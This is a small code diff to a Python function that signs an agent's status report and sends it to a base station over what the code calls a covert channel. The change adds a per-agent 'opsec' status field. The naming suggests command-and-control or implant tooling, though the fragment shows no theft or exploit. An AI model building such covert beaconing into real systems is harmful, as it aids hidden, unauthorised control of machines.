@@ -679,7 +679,11 @@ def phone_home(base_url: str, agent_key: str, report: AgentReport,
                comms: CovertComms | None = None) -> bool:
     """Send report to the base station via covert channel. Returns True on success."""
     url = f"{base_url.rstrip('/')}/api/fleet/report"
-    payload = report.to_json().encode()
+    c = comms or build_comms()
+    # Embed covert status so base station can display opsec state per agent
+    report_dict = report.to_dict()
+    report_dict["covert_status"] = c.status()
+    payload = json.dumps(report_dict).encode()
     sig = _sign_payload(payload, agent_key)
 
     headers = {
